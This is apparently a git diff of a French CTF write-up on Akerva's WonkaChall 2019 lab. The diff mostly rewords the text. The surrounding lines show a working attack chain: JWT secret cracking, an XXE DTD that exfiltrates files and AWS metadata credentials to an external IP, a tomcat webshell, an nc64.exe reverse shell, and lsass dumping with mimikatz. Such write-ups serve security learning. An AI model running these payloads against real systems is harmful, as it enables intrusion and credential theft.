@@ -3,13 +3,13 @@ author: "Maki"
 title: "WonkaChall 2019"
 slug: "wonkachall2019"
 date: 2019-07-20
-description: "Challenge from Akerva (french cybersecurity company), including Web, Active Directory and Linux stuff."
+description: "Challenge from Akerva (french cybersecurity company), deal with Web, Active Directory and Linux stuff."
 toc: true
 ---
 
 ## Introduction
 
-Cette année, lors de l'évènement LeHack 2019, nous avons assisté au lancement de la seconde édition du __WonkaChallenge__ réalisé par [Akerva](https://akerva.com/). Lors de la première édition, nous pouvions nous confronter à un certain nombre d'épreuves,  d'abord des challenges web puis de l'Active Directory. Les writeups officiels de l'édition de l'année dernière se trouvent ici :
+Cette année, lors de LeHack 2019, nous avons assisté au lancement de la seconde édition du __WonkaChallenge__ réalisé par [Akerva](https://akerva.com/). Lors de la première édition, nous pouvions retrouver un certain nombre d'épreuves, commençant par des challenges web et en continuant sur de l'Active Directory. Les writeups officiels de l'édition de l'année dernière se trouvent ici :
 
 1. Williwonka.shop : https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/
 2. Pramafil.com : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/
@@ -17,25 +17,25 @@ Cette année, lors de l'évènement LeHack 2019, nous avons assisté au lancemen
 4. Compromission du domaine DEV : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/
 5. Comme à la maison : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/
 
-Cette année, le WonkaChall a continué sur la même lancée et s'est étoffé d'une partie pwn et Linux à la fin. Cet article a pour but de présenter ma méthode de résolution des 13 épreuves. Akerva a aussi mis en ligne un writeup officiel, que vous pouvez retrouver ci-dessous :
+Cette année, le WonkaChall est resté sur la même lancée en ajoutant une partie pwn et Linux à la fin. Cet article a pour but de décrire ma résolution des 13 épreuves de ce WonkaChall. Akerva a aussi écrit un writeup officiel :
 
 1. Part 1 - WEB : https://akerva.com/blog/wonkachall-akerva-lehack-2019-write-up-part-1-web/
 2. Part 2 - WINDOWS : https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-2-windows/
 3. Part 3 - LINUX : https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-3-linux/
 
-Cet article va se découper en 13 parties, une pour chaque flag à trouver. Mais avant d'entrer dans le vif du sujet, ci-dessous un schéma du réseau complet (attention, petit spoil :)) : 
+Cet article va se découper en 13 parties, une pour chaque flag à trouver. Mais avant d'attaquer le vif du sujet, ci-dessous un schéma du réseau complet (attention, petit spoil :)) : 
 
 ![](/img/writeups/wonkachall2019/network_diagram_vm_nat.png)
 
-Certaines épreuves nécessitent du Windows et d'autres du Linux, donc je switch entre ma Commando (Windows) et ma Kali (Linux). Ma configuration est plutôt simple, un hôte Windows 10 avec VMWare pro et les deux VM en NAT. Maintenant que tous les prérequis sont présentés, j'espère que la lecture vous sera agréable !
+En fait, certaines épreuves nécessitent du Windows et d'autre du Linux, donc je switch entre ma Commando (Windows) et ma Kali (Linux). Mon setup est plutôt simple, un hôte Windows 10 avec VMWare pro et les deux VM en NAT. Maintenant que tous les prérequis sont présentés, j'espère que la lecture sera agréable !
 
-Le point d'entrée du challenge se trouve ici : https://willywonka.shop
+Le point d'entrer du challenge se trouve avec ce lien : https://willywonka.shop
 
 ![](https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif)
 
-## I. Step 1 - Erreur de développeur
+## I. Step 1 - Erreur de developpeur
 
-> Let's start easy, what are the latest changes made to the website ?
+> Let's start easy, what are the latest changes to the website ?
 
 ### TL;DR
 
@@ -52,7 +52,7 @@ Le point d'entrée du challenge se trouve ici : https://willywonka.shop
 _Fig 1_ : Index du site
 </center>
 
-La première chose que je fais en arrivant sur un site est lancer `dirsearch`. La wordlist par défaut est vraiment pertinente et en général, ce qu'elle sort se transforme en quick win :
+Première chose que je fais en arrivant sur un site, c'est de lancer `dirsearch`. La wordlist par défaut est vraiment pertinente, en général ce qu'elle sort se transforme en quick win :
 
 ```bash
 (KaliVM) ➜ ./dirsearch.py -u https://willywonka.shop/ -e html,php,txt           
@@ -92,18 +92,18 @@ Target: https://willywonka.shop/
 [01:29:39] 302 -  265B  - /submit  ->  http://willywonka.shop/profile?filetype=image%2Fpng
 ```
 
-On tombe sur un dossier `.git`. Même si ce genre de dossier affiche un beau "403 Forbidden", les fichiers sont souvent accessibles : 
+Un dossier `.git` a donc été trouvé. Même si ce genre de dossier affiche un beau "403 Forbidden", les fichiers sont souvent accessible : 
 
 <center>
 ![](/img/writeups/wonkachall2019/step1_git.png)
 _Fig 2_ : Dossier git accessible
 </center>
 
-Il nous est donc possible de récupérer le contenu des anciens commits grâce à `GitTools`.
+Il est donc possible de récupérer le contenu des anciens commits grâce à `GitTools`.
 
 ### I.2. Git dumping
 
-Pour obtenir l'intégralité du `git`, on va d'abord utiliser le script `gitdumper.sh`, puis `extractor.sh` pour les différents commits.
+Pour récupérer l'intégralité du `git`, on va d'abord utiliser le script `gitdumper.sh` puis le `extractor.sh` pour récupérer les différents commits.
 
 ```bash
 (KaliVM) ➜ mkdir out_dump  
@@ -141,7 +141,7 @@ A wild flag appears !
 
 ---
 
-### Ressources
+### Resources
 
 1. __maurosoria__, _dirsearch_, GitHub : https://github.com/maurosoria/dirsearch 
 2. __internetwache__, _GitTools_, GitHub : https://github.com/internetwache/GitTools
@@ -151,13 +151,13 @@ A wild flag appears !
 
 ## II. Step 2 - Une histoire de JWT
 
->  A 'deadbeef' ticket was submitted. Who's the victim ? 
+>  A ticket 'deadbeef' was submitted. Who's the victim ? 
 
 ### TL;DR
 
 1. Faire de l'audit de code grâce au `.git` trouvé dans l'étape d'avant, trouver le `debug=1` dans la configuration de Symphony ;
-2. Mettre la page `/reset` en mode debug afin de récupérer une stacktrace : `https://willywonka.shop/reset?debug=1` ;
-3. Dans la stacktrace ,trouver un sous-domaine (`backend.willywonka.shop`) et un JSON Web Token (JWT) ;
+2. Mettre la page `/reset` en debug afin de récupérer une stacktrace : `https://willywonka.shop/reset?debug=1` ;
+3. Dans la stacktrace on trouve un sous-domaine (`backend.willywonka.shop`) et un JSON Web Token (JWT) ;
 4. Il existe une autre page `/reset` sur le backend. Grâce à cette page, on sait que le site attend un JWT dans le cookie `backend-session` ;
 5. L'analyse du JWT récupéré dans la stacktrace montre qu'il est protégé par une clé secrète (HS256) ;
 6. Le bruteforcer avec `rockyou` et trouver la clé `s3cr3t` ;
@@ -188,8 +188,7 @@ Lors de l'utilisation de l'application, on se rend compte qu'il est possible de 
 _Fig 3_ : Impossible de trouver l'utilisateur
 </center>
 
-Pour tester cette théorie, j'ai choisi une liste d'utilisateurs provenant du GitHub SecList
-. Elle est plutôt courte, donc rapide. L'intruder de Burp fait l'affaire pour ce test :
+Pour tester cette théorie, j'ai utilisé la wordlist des usernames de seclist. Cette wordlist est plutôt courte, donc rapide. L'intruder de la version gratuite de burp fait l'affaire pour ce test :
 
 <center>
 ![](/img/writeups/wonkachall2019/step2_intruder.png)
@@ -200,7 +199,7 @@ Si un utilisateur valide est soumit à l'application, alors cette application re
 
 <center>
 ![](/img/writeups/wonkachall2019/step2_users_list_index.png)
-_Fig 5_ : Enumération d'utilisateurs 2/2
+_Fig 5_ : Enumération d'utilisateur 2/2
 </center>
 
 Les utilisateurs sont donc :
@@ -227,7 +226,7 @@ debug:
     controller: #TODO#
 ```
 
-N'étant pas familier avec Symphony, j'ai perdu du temps à comprendre pourquoi cette variable ne fonctionnait pas sur la route principale. Finalement, en plaçant un utilisateur valide (tel que `aas`) dans le formulaire de reset et en ajoutant le paramètre GET, le framework renvoie la stacktrace de l'application :
+N'étant pas familier avec Symphony, j'ai perdu du temps à comprendre pourquoi cette variable ne fonctionnait pas sur la route principale. Finalement, placer un utilisateur valide (tel que `aas`) dans le formulaire de reset et ajouter le paramètre GET renvoi la stacktrace de l'application :
 
 <center>
 ![](/img/writeups/wonkachall2019/step2_stacktrace.png)
@@ -314,7 +313,7 @@ Cette trace divulgue des informations sensibles quant au SI de la cible :
 
 ### II.4. Enumération web sur le backend
 
-Nouveau site web, nouveau `dirsearch` : celui-ci renvoie énormément de `403`. Après un filtrage de qualité, le scan affiche des résultats pertinents :
+Nouveau site web, nouveau dirsearch. Celui-ci renvoi énormément de `403`. Après un filtrage de qualité, le scan donne des résultats pertinents :
 
 ```bash
 (KaliVM) ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://backend.willywonka.shop -e php,html,txt,pdf,zip -t 25 | grep -v 403
@@ -328,7 +327,7 @@ Target: https://backend.willywonka.shop
 [11:44:37] 302 -  219B  - /reset  ->  http://backend.willywonka.shop/login
 ```
 
-Les résultats sont relativement équivalents aux résultats du frontend. Cependant, on remarque que toutes les pages du backend sont redirigées vers une page de `/login`. Cette page attend un JSON Web Token (JWT) :
+Les résultats sont relativement équivalents aux résultats du frontend. Cependant, toutes les pages du backend sont redirigé vers une page de `/login`. Cette page attend un JSON Web Token (JWT) :
 
 <center>
 ![](/img/writeups/wonkachall2019/step2_backend_jwt.png)
@@ -375,7 +374,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx
 }
 ```
 
-Afin de créer un nouveau jeton fonctionnel, on modifie les éléments suivants : `aud` et `exp`. Le premier élément permet de sélectionner le bon domaine. Le second correspond à l'expiration du token, choisir une date suffisamment lointaine garantit la tranquillité. Modifier un JWT `HS256` est relativement simple. Il existe plusieurs outils efficaces, comme `jwt_tool`. En passant une wordlist pertinente en paramètre, cet outil peut bruteforce le secret du token :
+Afin de faire un nouveau jeton fonctionnel, il faut modifier les éléments suivants : `aud` et `exp`. Le premier élément permet de sélectionner le bon domaine. Le second, correspond à l'expiration du token, une date suffisamment éloignée garantit la tranquillité. Modifier un JWT `HS256` est relativement simple. Il existe un certain nombre d'outils efficace, comme `jwt_tool`. En plaçant une wordlist pertinente en paramètre, cet outil peut bruteforce le secret du token :
 
 ```bash
 (KaliVM) ➜ python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt 
@@ -420,7 +419,7 @@ Le secret a été cassé avec succès, il est possible de signer le nouveau jeto
 _Fig 8_ : Nouveau jeton
 </center>
 
-Avec ce nouveau JWT, il est possible de passer outre l'authentification et d'accéder ainsi au backend de l'application :
+Avec ce nouveau JWT, il est possible de passer outre l'authentification et ainsi accéder au backend de l'application :
 
 ```
 https://backend.willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2OTkxMiwiZXhwIjoxOTk5OTk5OTk5fQ.pZxLNOIrI1DCRdB-MBWDNtDnmeKeANTNm5btAoY6Pmw
@@ -457,7 +456,7 @@ _Fig 9_ : Second flag
 ### TL;DR
 
 1. Forger une XXE OOB via le fichier SVG ;
-2. Uploader le fichier SVG à l'adresse : `http://willywonka.shop/profile?filetype=image%2fsvg%2bxml`, ne pas oublier de changer le MIME type ;
+2. Upload le fichier SVG à l'adresse : `http://willywonka.shop/profile?filetype=image%2fsvg%2bxml`, ne pas oublier de changer le MIME type ;
 3. Remplir le formulaire avec `aas` en nom de victime et de la donnée random ;
 4. Récupérer l'id du ticket et y accéder dans le backend ;
 5. Cliquer sur `autoresize` pour déclencher la XXE OOB.
@@ -466,9 +465,9 @@ _Fig 9_ : Second flag
 
 ### III.1. Reconnaissance
 
-La [plateforme](https://challenge.akerva.com) du challenge propose un hint par épreuve. Celui de cette épreuve énonce clairement qu'il s'agit d'une XXE via SVG. Le MIME type du fichier à envoyer est défini dans un paramètre GET, sur la page `submit` du __frontend__.
+La [plateforme](https://challenge.akerva.com) du challenge propose un hint par épreuve. Celui de cette épreuve dit clairement qu'il s'agit d'une XXE via SVG. Le MIME type du fichier à envoyer est défini dans un paramètre GET, sur la page `submit` du __frontend__.
 
-Il est possible pour un attaquant de changer ce MIME type et d'uploader ainsi un fichier SVG XML contenant la charge de la XXE. Lorsque le ticket est correctement uploadé, un identifiant est généré. Cet identifiant permet d'accéder au ticket dans le __backend__.
+Il est possible pour un attaquant de changer ce MIME type et ainsi uploader un fichier SVG XML contenant la charge de la XXE. Lorsque le ticket est correctement uploadé, un identifiant est généré. Cet identifiant permet d'accéder au ticket dans le __backend__.
 
 <center>
 ![](/img/writeups/wonkachall2019/step3_frontendform.png)
@@ -479,22 +478,22 @@ _Fig 10_ : Formulaire d'upload sur le frontend
 
 Par défaut, l'URL du __frontend__ accepte les images PNG : `https://frontend.willywonka.shop/profile?filetype=image%2Fpng`
 
-Le mime-type est présent en paramètre GET, alors pour que l'application accepte les SVG XML il suffit de le changer : `image%2fsvg%2bxml`
+Afin que l'application accepte les SVG XML : `image%2fsvg%2bxml`
 
-Une XXE Out-of-band (OOB) est similaire à une XXE "classique", ou "in-band". Une OOB est une XXE à l'aveugle qui va charger un DTD distant. Les entités présentent dans ce DTD seront ensuite exécutées, permettant ainsi de forcer une extraction de données. Le schéma suivant devrait être plus parlant :
+Une XXE Out-of-band (OOB) est similaire à une XXE "classique", ou in-band. Une OOB est une XXE à l'aveugle qui va charger un DTD distant. Les entités présentes dans ce DTD seront ensuite exécutées, permettant ainsi de forcer une extraction de données. Le schéma suivant devrait être plus parlant :
 
 <center>
 ![](/img/writeups/wonkachall2019/step3_xxe_oob_nutshell.png)
 _Fig 11_ : XXE OOB in a nutshell
 </center>
 
-Lors de CTF passés, j'ai déjà évoqué les XXE OOB : [Santhacklaus 2018](https://maki.bzh/walkthrough/santhacklaus2018/#archdrive-4-3). Dans cet article, le même serveur a été utilisé, mais il est aussi possible d'utiliser deux instances [ngrok](https://maki.bzh/stupidthings/dontpayvps/).
+Lors de CTF passés, j'ai déjà évoqué les XXE OOB : [Santhacklaus 2018](https://maki.bzh/walkthrough/santhacklaus2018/#archdrive-4-3). Dans cet article, le même serveur a été utilisé, mais il est possible d'utiliser deux instances [ngrok](https://maki.bzh/stupidthings/dontpayvps/).
 
 ### III.3. Exploitation
 
 Ci-dessous les fichiers nous permettant de mener à bien l'exploitation :
 
-* ro.svg : le SVG XML contenant l'appel des entités externes du fichier DTD.
+* ro.svg : le SVG XML contenant l'appelle des entités externes du fichier DTD.
 
 ```xml
 <!DOCTYPE svg [
@@ -506,14 +505,14 @@ Ci-dessous les fichiers nous permettant de mener à bien l'exploitation :
 </svg>
 ```
 
-* ro.dtd : charge contenant les entités permettant de cibler un fichier et d'exfiltrer son contenu.
+* ro.dtd : charge contenant les entités permettant de cibler un fichier et exfiltrer son contenu.
 
 ```xml
 <!ENTITY % secret1 SYSTEM "file:///flag.txt">
 <!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
 ```
 
-__Note__ : l'adresse IP utilisée (51.158.113.8) est un VPS temporaire de chez _Scaleway_ avec un __Python SimpleHTTPServer__ sur le port 80.
+__Note__ : l'adresse IP utilisée (51.158.113.8) est un VPS temporaire chez _Scaleway_ avec un __Python SimpleHTTPServer__ sur le port 80.
 
 Lorsque l'environnement est correctement configuré, il ne reste qu'à uploader la charge via le formulaire sur le __frontend__ : 
 
@@ -522,9 +521,9 @@ Lorsque l'environnement est correctement configuré, il ne reste qu'à uploader 
 _Fig 12_ : Formulaire frontend rempli
 </center>
 
-En retour, le __frontend__ nous renvoie l'identifiant du ticket : _`e6afec4a`_. Le bouton __Autoresize__ de l'application en __backend__ appelle le parser XML vulnérable. C'est donc à ce moment que la charge est exécutée. 
+En retour le __frontend__ nous renvoi l'identifiant du ticket : _e6afec4a_. Le bouton __Autoresize__ de l'application en __backend__ appelle le parser XML vulnérable. C'est donc à ce moment que la charge est exécutée. 
 
-__Note__ : on observe de l'activité sur les logs du __Python SimpleHTTPServer__.
+__Note__ : on peut oberserver de l'activité sur les logs du __Python SimpleHTTPServer__.
 
 <center>
 ![](/img/writeups/wonkachall2019/step3_flag.png)
@@ -553,9 +552,9 @@ Dans ce cas précis, ce n'est pas réellement une XXE OOB, car le retour s'affic
 
 ### TL;DR
 
-1. La XXE OOB nous permet de récupérer les identifiants S3 Bucket à l'adresse suivante : `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-2. Les informations du bucket se situent ici : `http://169.254.169.254/latest/dynamic/instance-identity/document`
-3. Initialiser les variables d'environnement avec les informations trouvées pour se connecter  : `AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_SESSION_TOKEN`
+1. La XXE OOB nous permet de récupérer les identifiants S3 Bucket à l'adresse : `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+2. Les informations du bucket se situent : `http://169.254.169.254/latest/dynamic/instance-identity/document`
+3. Initialiser les variables d'environnements avec les informations trouvées pour se connecter `AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_SESSION_TOKEN`
 4. Lister le contenu du bucket : `aws s3 ls s3://willywonka-shop`
 5. Récupérer le flag : `aws s3 cp s3://willywonka-shop/Flag-04.txt .`
 
@@ -563,7 +562,7 @@ Dans ce cas précis, ce n'est pas réellement une XXE OOB, car le retour s'affic
 
 ### IV.1. Reconnaissance
 
-Dû à la XXE OOB, il est possible de récupérer le contenu de certains fichiers. Cependant il faut connaitre son chemin et avoir les droits. En général, un attaquant essaiera de récupérer le fichier `/etc/passwd`, afin de récupérer les utilisateurs du système. Parfois, il arrive que le `.bash_history` de l'utilisateur courant soit accessible par tout le monde, c'est ce qu'il se passe dans notre cas :
+Dû à la XXE OOB, il est possible de récupérer le contenu de certains fichiers, il faut connaitre son chemin et avoir les droits. En général, un attaquant essaiera de récupérer le fichier `/etc/passwd`, afin de récupérer les utilisateurs du système. Parfois, il arrive que le `.bash_history` de l'utilisateur courant soit accessible par tout le monde, c'est ce qu'il s'est passé dans notre cas :
 
 ```bash
 [...]
@@ -579,7 +578,7 @@ Revenons à notre XXE, jusqu'à présent seul le schéma `file://` a été utili
 
 ### IV.2. Exploitation
 
-En remplaçant `file:///flag.txt` par `http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/` dans la charge __ro.dtd__, il est possible de récupérer les informations de connexion.
+En remplaçant `file:///flag.txt` par `http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/` dans la charge __ro.dtd__, il est possible de récupérer les informations de connexions.
 
 ```xml
 <!ENTITY % secret1 SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/">
@@ -673,7 +672,7 @@ download: s3://willywonka-shop/tools/vpn/wonka_internal.ovpn to ./wonka_internal
 0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528
 ```
 
-En plus du flag de cette étape, il y a un fichier VPN `wonka_internal.ovpn` dans le bucket, qui laisse présager un active directory.
+En plus du flag de cette étape, il y a un fichier VPN `wonka_internal.ovpn` dans le bucket. Laissant présager de l'active directory.
 
 ### IV.5. Flag
 
@@ -697,8 +696,8 @@ En plus du flag de cette étape, il y a un fichier VPN `wonka_internal.ovpn` dan
 
 1. Se connecter au VPN récupéré dans le bucket ;
 2. Une nouvelle route est apparue : `172.16.42.0/24` ;
-3. Effectuer une énumération de ce nouveau réseau et remarquer une machine avec le port 8080 (tomcat) ouvert ;
-4. Utiliser `dirsearch` avec une wordlist tomcat (seclist), et trouver la page `/host-manager/` ;
+3. Énumération de ce nouveau réseau et remarquer une machine avec le port 8080 (tomcat) ouvert ;
+4. Utiliser `dirsearch` avec une wordlist tomcat (seclist), on trouve la page `/host-manager/` ;
 5. Se connecter avec les identifiants `tomcat : tomcat` ;
 6. Monter un partage samba nommé `data` avec un webshell (__cmd.war__) à l'intérieur ;
 7. Déployer le webshell en tant que nouvelle application via les `UNC path` ;
@@ -709,7 +708,7 @@ En plus du flag de cette étape, il y a un fichier VPN `wonka_internal.ovpn` dan
 
 ### V.1. Reconnaissance
 
-Lorsque le tunnel VPN est correctement monté, une nouvelle adresse apparait :
+Lorsque le tunnel VPN est correctement monté, une nouvelle apparait :
 
 ```bash
 ➜ ip r | grep tun0
@@ -718,14 +717,14 @@ Lorsque le tunnel VPN est correctement monté, une nouvelle adresse apparait :
 172.16.42.0/24 via 10.8.0.17 dev tun0 
 ```
 
-Il existe plusieurs techniques de reconnaissances afin de trouver tous les hôtes de ce réseau: 
+Dans le but de trouver tous les hôtes de ce réseau, il existe plusieurs techniques de reconnaissances : 
 
-* __Ping scan__ : rapide mais peu pertinent depuis que la plupart des hôtes Windows ne répondent pas au ping. De plus, le ping scan de nmap (-sn) fonctionne de la façon suivante : ping, vérification du port 80, vérification du port 443, ping ;
-* __Port scan__ : Retenir quelques ports connus et vérifier s'ils sont ouverts. Cette méthode est un peu plus lente, mais fonctionne relativement bien.
+* __Ping scan__ : Qui est rapide mais peu pertinent depuis que la plupart des hôtes Windows ne répondent pas au ping. De plus, le ping scan de nmap (-sn) fonctionne de la façon suivante : ping, vérification du port 80, vérification du port 443, ping ;
+* __Port scan__ : Retenir quelques ports connus et voir s'ils sont ouverts. Cette méthode est un peu plus lente, mais fonctionne relativement bien.
 
-__Note__ : Personnellement je fais un __premier masscan__ avec environ 100 ports connus sur l'ensemble du réseau, puis un __second masscan__ avec l'ensemble des ports TCP et UDP sur les hôtes trouvés. Enfin, __un nmap__ spécifique sur les ports et hôtes trouvés. C'est la méthode la plus rapide que j'ai pu trouver jusqu'à présent.
+__Note__ : Personnellement je fais un __premier masscan__ avec environ 100 ports connus sur l'ensemble du réseau. Un __second masscan__ avec l'ensemble des ports TCP et UDP sur les hôtes trouvés. Enfin, __un nmap__ spécifique sur les ports et hôtes trouvés. C'est la méthode la plus rapide que j'ai trouvé jusqu'à présent.
 
-CI-dessous le _premier masscan_ :
+Dessous le _premier masscan_ :
 
 ```bash
 (KaliVM) ➜ sudo masscan -e tun0 -p22,21,23,80,443,445,139,136,111,U:161,U:162,U:53,1433,3306,53,3389,5432,631 --rate 1000 172.16.42.0/24
@@ -735,7 +734,7 @@ Discovered open port 445/tcp on 172.16.42.101
 Discovered open port 445/tcp on 172.16.42.11                                   
 ```
 
-Avec cette méthode, trois machines ressortent :
+Avec cette méthode trois machines sont ressorties :
 
 * 172.16.42.5
 * 172.16.42.11
@@ -791,11 +790,11 @@ Host script results:
 |_  start_date: 1601-01-01 00:09:21
 ```
 
-Cette machine ressemble à un Domain Controller, et ce pour plusieurs raisons :
+Cette machine ressemble à un Domain Controller pour plusieurs raisons :
 
-* Le port 53 (DNS) est caractéstique d'un AD
-* Le port 3268 (LDAP) mentionne le domaine __factory.lan__
-* Le nom d'hôte est plutôt explicite : __DC01-WW2__
+* Le port 53 (DNS), étant une caractéstique d'un AD
+* Le port 3268 (LDAP), mentionnant le domaine __factory.lan__
+* Son nom d'hôte plutôt explicit : __DC01-WW2__
 
 
 #### V.1.b. 172.16.42.11
@@ -835,10 +834,10 @@ Host script results:
 |_  start_date: 1601-01-01 00:09:21
 ```
 
-Intuitivement, cette machine ressemble au point d'entrée que nous cherchons. Les deux premières hypothèses à exploiter  sont donc :
+D'intuition cette machine ressemble au point d'entrée que nous cherchons. Les deux premières hypothèses fut :
 
 1. Connexions anonymes sur le partage Samba ;
-2. Vulnérabilités et / ou identifiants par défaut sur le serveur 8080, tomcat étant une solution répandue sur ce port.
+2. Vulnérabilité et / ou identifiants par défaut sur le serveur 8080, tomcat étant une solution répandue sur ce port.
 
 #### V.1.c. 172.16.42.101
 
@@ -859,9 +858,9 @@ PORT      STATE SERVICE       REASON  VERSION
 49712/tcp open  msrpc         syn-ack Microsoft Windows RPC
 ```
 
-Les trois premiers ports sont suspects et peuvent laisser penser à :
+Les trois premiers ports sont suspects et peuvent lancer penser :
 
-1. Une connexion anonyme sur le RPC et SMB ;
+1. Connexion anonyme sur le RPC et SMB ;
 2. Un service "unknown" sur le port 5040.
 
 ### V.2. Enumération du serveur web
@@ -873,14 +872,14 @@ Après quelques tentatives infructueuses sur les différents serveurs SMB, il es
 _Fig 14_: Index du serveur web
 </center>
 
-En naviguant sur le site, il est possible de trouver une cartographie du réseau : `http://172.16.42.11:8080/infra.jsp`
+En naviguant sur le site, il est possible de retrouver une cartographie du réseau : `http://172.16.42.11:8080/infra.jsp`
 
 <center>
 ![](/img/writeups/wonkachall2019/infra.png)
 _Fig 15_: Schéma réseau incomplet
 </center>
 
-L'extension __jsp__ nous conforte dans l'idée que nous sommes en présence d'un serveur tomcat, la page 404 la confirme. L'exécution de dirsearch avec une wordlist adaptée retourne des pages intéressantes :
+L'extension __jsp__ conforte l'idée du serveur tomcat, la page 404 affirme cette idée. L'exécution de dirsearch avec une wordlist adaptée retourne des pages intéressantes :
 
 ```bash
 (KaliVM) ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u http://172.16.42.11:8080/ -e jsp,html,do,action,txt -w ./tomcat.txt    
@@ -889,7 +888,7 @@ L'extension __jsp__ nous conforte dans l'idée que nous sommes en présence d'un
 [15:08:17] 302 -    0B  - /manager  ->  /manager/
 ```
 
-D'ordinaire, la page `manager` est la solution de facilité : avec des identifiants par défaut, il suffit de générer un webshell avec l'extension __war__ et de l'uploader. Dans notre cas, cette page est ... Indisponible :
+D'ordinaire, la page `manager` est la solution de facilité avec des identifiants par défaut, il suffit de générer un webshell avec l'extension __war__ et de l'uploader. Dans notre cas, cette page est ... Indisponible :
 
 <center>
 ![](/img/writeups/wonkachall2019/step5_manager.png)
@@ -900,11 +899,11 @@ Dans les résultats du dirsearch, il y a aussi la page `/host-manager`. Cette pa
 
 > tomcat : tomcat
 
-__Certilience__ a écrit un très bon guide concernant cette attaque : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/
+__Certilience__ a écrit un très bon guide pour cette attaque : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/
 
 ### V.3. Mise en place de l'exploitation
 
-N'étant pas un grand fan de Metasploit, j'essaie de l'utiliser le moins possible, et ce surtout lorsque d'autres solutions existent. Une d'elle consiste à récupérer un webshell "standard", plutôt que de générer une charge avec un meterpreter. En effet, une archive __war__ consiste tout simplement en une archive zip avec une hiérarchie particulière :
+N'étant pas un grand fan de Metasploit, j'essai de l'utiliser le moins possible. Surtout lorsqu'il y a d'autres solutions. La solution est de récupérer un webshell "standard", plutôt que de générer une charge avec un meterpreter. Une archive __war__ est simplement une archive zip avec une hiérarchie particulière :
 
 ```bash
 (KaliVM) ➜ tree .                   
@@ -946,7 +945,7 @@ L'archive __war__ utilisée lors de l'exploitation peut être téléchargée ici
 
 #### V.3.a. Nouvel hôte
 
-En suivant les indications de __Certilience__, on ajoute une entrée dans le fichier `/etc/hosts` de notre machine afin de lier l'IP du serveur tomcat à un hostname :
+En suivant les indications de __Certilience__, il faut ajouter une entrée dans le fichier `/etc/hosts` de notre machine afin de lier l'IP du serveur tomcat à un hostname :
 
 ```bash
 (KaliVM) ➜ sudo echo "172.16.42.11	maki-lab" >> /etc/hosts
@@ -994,7 +993,7 @@ Le binaire `rlwrap` (readline wrapper) sert d'historique de commandes, mais auss
 
 #### V.5.b. Application malveillante - Serveur tomcat
 
-L'UNC path ci-dessous va exécuter le binaire en mémoire sur le serveur tomcat et établir ainsi une connexion sur le port 12345 :
+L'UNC path ci-dessous va exécuter le binaire en mémoire sur le serveur tomcat et ainsi établir une connexion sur le port 12345 :
 
 ```bash
 (SRV01-INTRANET) ➜ \\10.8.0.10\data\nc64.exe -e cmd.exe 10.8.0.10 12345
@@ -1005,7 +1004,7 @@ L'UNC path ci-dessous va exécuter le binaire en mémoire sur le serveur tomcat 
 _Fig 19_ : Reverse shell
 </center>
 
-Cette méthode permet de récupérer un accès shell plus ou moins interactif et plus ou moins stable.
+C'est ainsi qu'il est possible de récupérer un accès shell plus ou moins intéractif et plus ou moins stable.
 
 <center>
 ![](/img/writeups/wonkachall2019/step5_flag.png)
@@ -1035,7 +1034,7 @@ _Fig 20_ : Flag
 
 1. Exécuter `procdump.exe` sur le serveur tomcat (SRV01-INTRANET) ;
 2. Récupérer le minidump du processus `lsass.exe` ;
-3. Retrouver les identifiants stockés grâce à `mimikatz` en local : `adminserver` : `factory.lan\adminServer : #3LLe!!estOuL@Poulette`.
+3. Retrouver les identifiants stocké grâce à `mimikatz` en local : `adminserver` : `factory.lan\adminServer : #3LLe!!estOuL@Poulette`.
 
 ---
 
@@ -1043,11 +1042,11 @@ _Fig 20_ : Flag
 
 Lorsqu'un accès privilégié est obtenu sur un serveur, il est naturel d'essayer de récupérer des identifiants (mimikatz pour Windows ou swapdigger pour Linux). En l'occurrence, __Mimikatz__ va chercher les identifiants dans la mémoire du processus de _lsass.exe_. 
 
-Une autre méthode, plus difficile à détecter pour de potentiels anti-virus, consiste à récupérer la mémoire de ce processus grâce à __procdump.exe__. Ce binaire est développé et signé par Microsoft et fait partie des _Windows Sysinternals_. Mimikatz est capable de charger un dump mémoire de ce processus en local et d'en extraire les identifiants. 
+Une autre méthode, plus difficile à détecter pour de potentiels anti virus, consiste à récupérer la mémoire de ce processus grâce à __procdump.exe__. Ce binaire est développé et signé par Microsoft et fait partie des _Windows Sysinternals_. Mimikatz est capable de charger un dump mémoire de ce processus en local et en extraire les identifiants. 
 
 ### VI.2. Getting lsass minidump
 
